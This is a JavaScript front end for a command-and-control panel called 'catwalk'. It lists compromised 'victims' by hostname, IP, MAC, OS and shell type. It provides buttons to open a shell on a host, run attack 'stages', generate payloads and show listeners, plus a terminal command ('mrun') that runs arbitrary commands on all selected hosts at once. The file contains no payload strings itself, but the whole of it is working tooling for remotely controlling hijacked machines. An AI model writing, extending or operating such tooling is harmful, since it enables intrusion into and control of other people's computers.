var selectedArray = []
var victimArray = []
var ouiArray = {}
var ouiColors = {}
const container = document.getElementById('boxtainer');
var mostRecentData = ""
var haltCreation = false
var removedMsg = false
var deleteVictims = false
var deleteWarnToast = ""
var firstelem = false

var term = new window.Terminal({
    cursorBlink: true,
    convertEol: true,
    cols: Math.floor(document.getElementById("terminal").offsetWidth / 12),
    rows: Math.floor(document.getElementById("terminal").offsetHeight / 19),
});

String.prototype.formatUnicorn = String.prototype.formatUnicorn ||
function () {
    "use strict";
    var str = this.toString();
    if (arguments.length) {
        var t = typeof arguments[0];
        var key;
        var args = ("string" === t || "number" === t) ?
            Array.prototype.slice.call(arguments)
            : arguments[0];

        for (key in args) {
            str = str.replace(new RegExp("\\{" + key + "\\}", "gi"), args[key]);
        }
    }

    return str;
};

function rgbToHex(rgbString) {
    const match = rgbString.match(/^rgb\((\d+),\s*(\d+),\s*(\d+)\)$/);

    if (!match) {
        throw new Error('Invalid RGB string format');
    }

    const toHex = (c) => {
        const hex = c.toString(16);
        return hex.length === 1 ? "0" + hex : hex;
    };

    return "#" + toHex(parseInt(match[1])) + toHex(parseInt(match[2])) + toHex(parseInt(match[3]));
}

function createTinyBox(data) {
    // Create the main div element
    const tinyBox = document.createElement('div');
    var active = 0;
    firstelem = data['uid']
    tinyBox.classList.add('tiny-box');
    tinyBox.id = data['uid']+"_DIV"
    tinyBox.setAttribute("selected", false)

    const bigDiv = document.createElement('div');
    bigDiv.style.cssText = 'float:left; padding-top: 1px; padding-right: 1px; width: 100%; height: 90%';

    bigDiv.addEventListener("click", function() {
        if (tinyBox.getAttribute("selected") == 'true') {
            tinyBox.setAttribute("selected", false)
            selectedArray.splice(selectedArray.indexOf(bigDiv.id), 1)
        } else { 
            tinyBox.setAttribute("selected", true)
            selectedArray.push(data['uid'])
        }

        document.getElementById("sl-total").innerHTML = "selected: "+selectedArray.length.toString()
    })

    // Create the first inner div element with float:right style
    const innerDiv1 = document.createElement('div');
    innerDiv1.style.cssText = 'float:right; padding-top: 1px; padding-right: 1px;';

    // Create and append the span elements to innerDiv1
    const lastActiveSpan = document.createElement('span');
    lastActiveSpan.textContent = 'Last Active: '+data['lastActive'];
    lastActiveSpan.id = data['uid']+"_ACTIVITY"
    innerDiv1.appendChild(lastActiveSpan);

    innerDiv1.appendChild(document.createElement('br'));

    if (data['active'] == "0") {
        active = "disconnected"
    } else { active = data['active'] }
    const activeSpan = document.createElement('span');
    activeSpan.textContent = 'Active: '+active;
    innerDiv1.appendChild(activeSpan);

    innerDiv1.appendChild(document.createElement('br'));

    // Create the h2 element
    const h2Element = document.createElement('h2');
    h2Element.textContent = data['hostname'];

    // Create the span elements
    const macSpan = document.createElement('span');
    macSpan.textContent = data['mac'];

    const ipSpan = document.createElement('span');
    ipSpan.textContent = 'IP: '+data['ip'];

    const ouiSpan = document.createElement('span');
    ouiSpan.textContent = 'OUI: '+data['oui'];

    const uidSpan = document.createElement('span');
    uidSpan.textContent = 'ID: '+data['uid'];

    // Create the second inner div element with margin: 0 style
    const innerDiv2 = document.createElement('div');
    innerDiv2.style.margin = '0';

    // Create the ul element
    const ulElement = document.createElement('ul');
    ulElement.style.cssText = 'float: left;';

    // Create and append the span elements to ulElement
    const cpuArchitectureSpan = document.createElement('span');
    cpuArchitectureSpan.textContent = 'CPU Architecture: '+data['arch'];
    ulElement.appendChild(cpuArchitectureSpan);
    ulElement.appendChild(document.createElement('br'));

    const operatingSystemSpan = document.createElement('span');
    operatingSystemSpan.textContent = 'Operating System: '+data['os'];
    ulElement.appendChild(operatingSystemSpan);
    ulElement.appendChild(document.createElement('br'));

    const shellTypeSpan = document.createElement('span');
    shellTypeSpan.textContent = 'Shell Type: '+data['shelltype'];
    ulElement.appendChild(shellTypeSpan);
    ulElement.appendChild(document.createElement('br'));

    // Create the button element
    const buttonElement = document.createElement('button');
    buttonElement.classList.add('connect-button');
    buttonElement.textContent = 'Control';
    buttonElement.addEventListener('click', function() {
        location.href = "/shell?uid="+data["uid"]
        //window.open("/shell?uid="+data["uid"], '_blank', 'location=yes,height=720,width=1280,scrollbars=no,status=yes')
    });

    const buttonDiv = document.createElement('div')
    buttonDiv.classList.add('dual-buttons')

    const selectButton = document.createElement('button');
    selectButton.classList.add('connect-button');
    selectButton.textContent = 'Select';
    selectButton.addEventListener('click', function() {
        if (tinyBox.getAttribute("selected") == 'true') {
            tinyBox.setAttribute("selected", false)
            selectedArray.splice(selectedArray.indexOf(bigDiv.id), 1)
        } else { 
            tinyBox.setAttribute("selected", true)
            selectedArray.push(data['uid'])
        }

        document.getElementById("sl-total").innerHTML = "selected: "+selectedArray.length.toString()
    });

    const stageButton = document.createElement('button');
    stageButton.classList.add('connect-button');
    stageButton.textContent = 'Run Stage';
    stageButton.addEventListener('click', function() {
        //open stage view
        isOk = true
        document.getElementById("stage-click").setAttribute("target", data['uid'])
        document.getElementById("stage-overlay").setAttribute("disabled", "false")
    });

    buttonDiv.appendChild(selectButton)
    buttonDiv.appendChild(stageButton)

    // Append elements to their respective parent elements
    bigDiv.appendChild(innerDiv1);
    bigDiv.appendChild(h2Element);
    bigDiv.appendChild(macSpan);
    bigDiv.appendChild(document.createElement('br'));
    bigDiv.appendChild(ipSpan);
    bigDiv.appendChild(document.createElement('br'));
    bigDiv.appendChild(ouiSpan);
    bigDiv.appendChild(document.createElement('br'));
    bigDiv.appendChild(uidSpan);
    innerDiv2.appendChild(ulElement);
    bigDiv.appendChild(innerDiv2);
    tinyBox.append(bigDiv)
    tinyBox.appendChild(buttonElement);
    tinyBox.appendChild(buttonDiv)

    // Return the created div
    return tinyBox;
}

function isUIDExist(uid) {
    for (var i = 0; i < victimArray.length; i++) {
        if (victimArray[i] == uid) {
            return true;
        }
    }
    return false;
}

function isOUIExist(oui) {
    for (var i = 0; i < ouiArray.length; i++) {
        if (ouiArray[i] == oui) {
            return true;
        }
    }
    return false;
}

function generateRandomColor() {
    var r = Math.floor(Math.random() * 155);
    var g = Math.floor(Math.random() * 155);
    var b = Math.floor(Math.random() * 155);

    return `rgb(${r},${g},${b})`;
}

function updateStages() {
    var xhr = new XMLHttpRequest();

    xhr.open('GET', '/api/shell/get_stages', true);
    xhr.onload = function() {
        const stageSelect = document.getElementById("all-stages")
        var jsonData = JSON.parse(xhr.responseText)

        console.log(jsonData)
        
        for (i=0; Object.keys(jsonData).length>i; i++) {
            key = Object.keys(jsonData)[i]
            value = jsonData[key]

            if (i == 0) {
                document.getElementById("stage-desc").innerHTML = value["description"]
            }

            var opt = document.createElement("option")
            opt.innerHTML = key
            opt.value = key
            stageSelect.appendChild(opt)
        }

        document.getElementById("all-stages").addEventListener("input", function(){
            document.getElementById("stage-desc").innerHTML = jsonData[this.value]["description"]
        })

        document.getElementById("stage-box").addEventListener("click", function(e){
            e.stopPropagation();
        })

        document.getElementById("stage-click").addEventListener("click", function(e){
            e.stopPropagation();
            xhr.open('POST', '/api/shell/stage', true);

            xhr.send(JSON.stringify({
                "uid": this.getAttribute("target"),
                "stage": document.getElementById("all-stages").value
            }));
        })
    };

    xhr.send();
}

function updateData() {
    var xhr = new XMLHttpRequest();

    xhr.open('GET', '/api/data/clients', true);
    xhr.onload = function() {
        var jsonData = JSON.parse(xhr.responseText)
        var ouiFound = false
        var linux = 0
        var windows = 0
        var connected = 0
        var disconnected = 0

        if (Object.keys(jsonData).includes("failure")) {
            if (jsonData["failure"] == "login") {
                window.location = "/login"
            }
        }
        
        mostRecentData = jsonData

        if (Object.keys(jsonData).length >= 2 && removedMsg == false) {
            document.getElementById("boxtainer").removeChild(document.getElementById("message"))
            removedMsg = true
        } else if (Object.keys(jsonData).length == 1 && removedMsg == false) {
            document.getElementById("message").innerHTML = `<pre>
?
 .o--.      
\`=,-,-'~~~~ 

Nothing here.
</pre>`
        }
        
        for (var i=0; i<Object.keys(jsonData).length; i++) {
            var uid = Object.keys(jsonData)[i]

            if (i == 0) {
                firstelem = uid
            }

            if (uid == "ouis") {
                continue;
            }

            if (!isUIDExist(uid)) {
                victimArray.push(uid)
                if (!haltCreation) { container.appendChild(createTinyBox(jsonData[uid])); }
            } else {
                if (!haltCreation) { document.getElementById(uid+"_ACTIVITY").innerHTML = "Last Active: " + jsonData[uid]["lastActive"] }
            }

            if (jsonData[uid]["os"] == "Linux") {
                linux += 1
            } else {
                windows += 1
            }

            if (jsonData[uid]["active"] == "0") {
                disconnected += 1
            } else {
                connected += 1
            }
        }
        
        if (windows != 0 || linux != 0) {
            if (oses.data.labels[0] == "no data") {
                oses.data.datasets[0].backgroundColor = ['#4169E1','#ff8c00']
                oses.data.datasets[0].data.splice(0, 1)
                oses.data.labels = ["windows", "linux"]
            }
            oses.data.datasets[0].data = [windows, linux];
            oses.update();
        }

        if (connected != 0 || disconnected != 0) {                    
            if (conns.data.labels[0] == "no data") {
                conns.data.datasets[0].backgroundColor = ['#003C00','#880808']
                conns.data.datasets[0].data.splice(0, 1)
                conns.data.labels = ["connections", "disconnections"]
            }
            conns.data.datasets[0].data = [connected, disconnected];
            conns.update();
        }

        
        if (jsonData["ouis"]["labels"].length != 0) {                    
            if (ouis.data.labels[0] == "no data") {
                ouis.data.datasets[0].data = []
                ouis.data.labels = []
                ouis.data.datasets[0].backgroundColor.splice(0, 1)
            }

            ouis.data.datasets[0].data = jsonData["ouis"]["datasets"][0]["data"]
            ouis.data.labels = jsonData["ouis"]["labels"]
            ouis.data.datasets[0].backgroundColor = jsonData["ouis"]["datasets"][0]["backgroundColor"]

            ouis.update();
        }       
        

        document.getElementById("total").innerHTML = "total: " + (Object.keys(jsonData).length - 1).toString()
        document.title = "catwalk | " + (Object.keys(jsonData).length - 1).toString() + " clients"
    };

    xhr.send();
}

/* Usage:
const container = document.getElementById('boxtainer'); // Assuming you have a container element with id 'container'
const newTinyBox = createTinyBox({
    "os": "Windows 10",
    "mac": "11:22:33:44:55:77",
    "ip": "192.168.0.1",
    "firstSeen": "1am",
    "lastActive": "not 1am",
    "arch": "x86",
    "shelltype": "powershell",
    "hostname": "DESKTOP-123456789",
});
container.appendChild(newTinyBox);
*/

function deleteContainers() {
    var xhr = new XMLHttpRequest();
    var amntOfVictims = selectedArray.length
    var initToast = Toastify({
        text: "<span style=\"font-family: roboto\">deleting {0} victims... (5s)</span>".formatUnicorn({0: amntOfVictims}),
        duration: 5 * 1000,
        gravity: "top", // `top` or `bottom`
        position: "right", // `left`, `center` or `right`
        stopOnFocus: true, // Prevents dismissing of toast on hover
        style: {
            background: "#484848",
            boxShadow: "0 3px 6px -1px rgba(0,0,0,.12),0 10px 36px -4px rgba(254,32,32,.3)",
        },
        escapeMarkup: false,
    })

    initToast.showToast();

    xhr.open('POST', '/api/shell/delete', true);
    xhr.onload = function() {
        console.log('remove')

        for (var i=0; i<selectedArray.length; i++) {
            console.log('remove')
            container.removeChild(document.getElementById(selectedArray[i]+"_DIV"));
        }
        selectedArray = []
        document.getElementById("sl-total").innerHTML = "selected: "+selectedArray.length.toString()
    };

    xhr.send(JSON.stringify({
        "uid": selectedArray,
    }));
    
    deleteVictims = false;

    Toastify({
        text: "<span style=\"font-family: roboto\">deleted {0} victims (2.5s)</span>".formatUnicorn({0: amntOfVictims}),
        duration: 2.5 * 1000,
        gravity: "top", // `top` or `bottom`
        position: "right", // `left`, `center` or `right`
        stopOnFocus: true, // Prevents dismissing of toast on hover
        style: {
            background: "#484848",
            boxShadow: "0 3px 6px -1px rgba(0,0,0,.12),0 10px 36px -4px rgba(254,32,32,.3)",
        },
        escapeMarkup: false,
    }).showToast()

    initToast.hideToast()
    deleteWarnToast.hideToast()
    updateData();

    // force ouis to clear and update
    ouiArray = []
    for (dataset=0; dataset<ouis.data.datasets.length; dataset++) {
        ouis.data.datasets[dataset].data = []
    }
    ouis.data.labels = []

    log("info", "deleted {0} clients: {1}".formatUnicorn({0:amntOfVictims, 1:selectedArray.join(", ")}))

    return;
}

function log(type, text) {
    term.write("\r")
    var currentdate = new Date(); 
    var time = currentdate.getDate() + "/"
                    + (currentdate.getMonth()+1)  + "/" 
                    + currentdate.getFullYear() + " @ "  
                    + currentdate.getHours() + ":"  
                    + currentdate.getMinutes() + ":" 
                    + currentdate.getSeconds();

    if (type == "info") {
        term.write("\x1b[38;2;75;75;255m[INFO]")
    } else if (type == "warn") {
        term.write("\x1b[38;2;255;255;0m[WARN]")
    } else if (type == "error") {
        term.write("\x1b[38;2;255;0;0m[ERR]")
    }

    term.write("\x1b[38;2;255;255;255m | \x1b[38;2;128;128;128m"+time+"\x1b[38;2;255;255;255m | ")
    term.write(text)
    term.write("\r\n")

    
}

var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/data/host', true);
xhr.onload = function() {
    var jsonData = JSON.parse(xhr.responseText)

    for (l=0; Object.keys(jsonData["modules"]).length>l; l++) {
        key = Object.keys(jsonData["modules"])[l]
        value = jsonData["modules"][key]

        var textEL = document.createElement("h2")
        textEL.innerHTML = `${key}: ${value["ip"]}:${value["port"]}`

        document.getElementById("listeners").appendChild(textEL)
    }
};

xhr.send();

var xhrPL = new XMLHttpRequest();
xhrPL.open('GET', '/api/generate/list', true);
xhrPL.onload = function() {
    var jsonData = JSON.parse(xhrPL.responseText)
    var dropdown = document.getElementById("payload-dropdown")
    for (var i=0; i<jsonData.payloads.length; i++) {
        var selection = document.createElement('option')
        selection.value = jsonData.payloads[i]
        selection.innerHTML = jsonData.payloads[i]

        dropdown.appendChild(selection)
    }
};

xhrPL.send();

var xhrMSG = new XMLHttpRequest();
xhrMSG.open('GET', '/api/generate/message', true);
xhrMSG.onload = function() {
    document.getElementById("msg").innerHTML = xhrMSG.responseText
};

xhrMSG.send();

//updateData() // first update to populate most recent

document.addEventListener("keydown", function(event) {
    if (event.key == "Delete") {
        console.log(deleteVictims)
        if (!deleteVictims) {
            deleteWarnToast = Toastify({
                text: "<span style=\"font-family: roboto\">are you sure you want to delete {0} victims?<br><span style='margin-left: 2px'></span>if so, click me or press delete again (10s)</span>".formatUnicorn({0: selectedArray.length}),
                duration: 10 * 1000,
                gravity: "top", // `top` or `bottom`
                position: "right", // `left`, `center` or `right`
                stopOnFocus: true, // Prevents dismissing of toast on hover
                style: {
                    background: "#484848",
                    boxShadow: "0 3px 6px -1px rgba(0,0,0,.12),0 10px 36px -4px rgba(254,32,32,.3)",
                },
                escapeMarkup: false,
                onClick: function() {deleteContainers()} // Callback after click
            })

            deleteWarnToast.showToast()
            
            deleteVictims = true;
        } else {
            deleteContainers()
        }
    }
    // use e.keyCode
});


document.getElementById("search").addEventListener("input", function() {
    var val = document.getElementById("search").value 
    var drpdwn = document.getElementById("search-dropdown").value

    if (val == "") {
        haltCreation = false
        updateData();
    }

    haltCreation = true

    while (container.firstChild) { // kill the children
        container.removeChild(container.firstChild);
    }

    for (var i=0; i<Object.keys(mostRecentData).length; i++) {
        var uid = Object.keys(mostRecentData)[i]

        if (mostRecentData[uid][drpdwn].toLowerCase().includes(val.toLowerCase())) { // somehow this works. i dont know how but it works and im not complaining
            container.appendChild(createTinyBox(mostRecentData[uid]));
        }

    }

})


function updatePayload() {
    var dropVal = document.getElementById('payload-dropdown').value

    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/api/generate/payload', true);
    xhr.onload = function() {
        var jsonData = JSON.parse(xhr.responseText)
        document.getElementById("payloadGen").value = jsonData["command"]
    };

    xhr.send(JSON.stringify({"payload": dropVal, "shell": document.getElementById("shell-dropdown").value}));
    document.getElementById("payloadGen").value = "asking server to generate payload...";
}

document.getElementById('payload-dropdown').onchange = function () {
    updatePayload()
}
document.getElementById('payload-refresh').onclick = function () {
    updatePayload()
}

setInterval(updateData, 1000);

function processCommand(cmd) {
    var args = cmd.split(" ")
    var command = args[0]
    args.shift()
    
    var strArgs = args.join(" ")

    commands = ["select", "deselect", "ls", "mrun"]

    term.write("\n\n")

    if (commands.includes(command)) {

        switch (command) {
            case 'select':
                var uid = args[0]
        
                if (uid == undefined) {
                    term.write(
                        `Clients selected:\n\t${selectedArray.join("\n\t")}`
                    )
                    return
                }
        
                document.getElementById(uid+"_DIV").style.backgroundColor = "#303030"
                selectedArray.push(uid)
        
                term.write(`Selected client "${uid}."`)
                return

            case 'deselect':
                var uid = args[0]

                document.getElementById(uid+"_DIV").style.backgroundColor = "#242424"
                selectedArray.splice(selectedArray.indexOf(uid), 1)

                term.write(`Deselected client "${uid}."`)
                return

            case 'ls':
                term.write(`Clients:\n\t${victimArray.join("\n\t")}`)
                return

            case 'mrun':
                var xhr = new XMLHttpRequest();
                xhr.open('POST', '/api/shell/run', true);
                xhr.send(JSON.stringify({
                    "uid": selectedArray,
                    "command": strArgs
                }));

                term.write("\tExecuted command \"{0}\" across {1} hosts.".formatUnicorn({0:strArgs, 1:selectedArray.length}))

                return
        }
    }
}

document.addEventListener('DOMContentLoaded', function(){
    let user = localStorage.getItem("user")
    if (user == undefined || user == null) {
        user = "localhost"
    }

    document.getElementById("welcome").innerHTML = `Welcome, ${user}.`
    document.getElementById("stage-overlay").addEventListener("click", function(){this.setAttribute("disabled", "true")})
    updateStages()
})

term.open(document.getElementById('terminal'));
term.setOption('theme', {
    background: '#101010',
    cursorBlink: true,
    cursorStyle: "line",
    convertEol: true,
});

log("info", "Welcome to the Catwalk terminal.")

var buffer = ""
term.write("\x1b[38;2;128;128;128m\n[catwalk]> \x1b[38;2;255;255;255m")
term.on("key", function(key, ev) {
    if (ev.keyCode === 13) {
        processCommand(buffer)
        term.write("\r\n")
        term.write("\x1b[38;2;128;128;128m\n[catwalk]> \x1b[38;2;255;255;255m")
        buffer = ""
    } else if (ev.keyCode === 8) {
        if (buffer.length != 0) {
            buffer = buffer.slice(0, buffer.length-1)
            console.log(buffer)
            term.write("\b \b")
        }
    } else {
        if (/^[\x00-\x7F]+$/.test(key)) {
            buffer += key;
            term.write(key)
        }
    }
})
term.attachCustomKeyEventHandler((arg) => { 
    if (arg.ctrlKey && arg.shiftKey && arg.code === "KeyC" && arg.type === "keydown") {
	    const selection = term.getSelection();
	    if (selection) {
		    navigator.clipboard.writeText(selection);

            var initToast = Toastify({
                text: "<span style=\"font-family: roboto\">copied</span>",
                duration: 1000,
                gravity: "top", // `top` or `bottom`
                position: "right", // `left`, `center` or `right`
                stopOnFocus: true, // Prevents dismissing of toast on hover
                style: {
                    background: "#484848",
                    boxShadow: "0 3px 6px -1px rgba(0,0,0,.12),0 10px 36px -4px rgba(254,32,32,.3)",
                },
                escapeMarkup: false,
            })
        
            initToast.showToast();

		    return false;
	    }
    }
    return true;
}); 
term.on("paste", function(data) {
    buffer += data
    term.write(data)
})